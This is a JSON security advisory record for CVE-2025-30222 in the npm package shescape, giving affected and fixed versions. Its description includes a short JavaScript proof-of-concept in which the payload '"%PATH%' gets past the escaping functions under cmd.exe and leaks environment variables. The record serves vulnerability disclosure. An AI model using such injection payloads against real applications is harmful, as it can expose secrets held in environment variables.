{
  "Identifier": "CVE-2025-30222",
  "PackageSlug": "npm/shescape",
  "Title": "Shescape has potential environment variable exposure on Windows with CMD",
  "Description": "This impact users of Shescape on Windows that explicitly configure `shell: 'cmd.exe'` or `shell: true` using any of `quote`/`quoteAll`/`escape`/`escapeAll`.\n\nAn attacker may be able to get read-only access to environment variables. Example:\n\n```javascript\nimport * as cp from \"node:child_process\";\nimport { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst shescape = new Shescape({\nshell: \"cmd.exe\",\n// Or\nshell: true, // Only if the default shell is CMD\n});\n\n// 2. Payload\nconst payload = '\"%PATH%';\n\n// 3. Usage\nlet escapedPayload;\n\nescapedPayload = shescape.quote(payload);\n// Or\nescapedPayload = shescape.quoteAll([payload]);\n// Or\nescapedPayload = shescape.escape(payload);\n// Or\nescapedPayload = shescape.escapeAll([payload]);\n\n// And (example)\nconst result = cp.execSync(`echo Hello ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n// Outputs \"Hello\" followed by the contents of the PATH environment variable\n```\n\nFor Shescape prior to v2.0.0, the `options` object must have `shell: 'cmd.exe'` or `shell: undefined` and `interpolation: true`.",
  "Date": "2025-03-26",
  "Pubdate": "2025-03-26",
  "AffectedRange": "\u003e=1.7.2 \u003c2.1.2",
  "FixedVersions": [
    "2.1.2"
  ],
  "AffectedVersions": "All versions starting from 1.7.2 before 2.1.2",
  "NotImpacted": "All versions before 1.7.2, all versions starting from 2.1.2",
  "Solution": "Upgrade to version 2.1.2 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2025-30222",
    "https://github.com/advisories/GHSA-66pp-5p9w-q87j",
    "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j",
    "https://github.com/ericcornelissen/shescape/pull/1916",
    "https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6",
    "https://github.com/ericcornelissen/shescape",
    "https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2"
  ],
  "CvssV2": "",
  "CvssV3": "",
  "UUID": "de4cfc04-9978-4355-9d46-4c92979f45a9"
}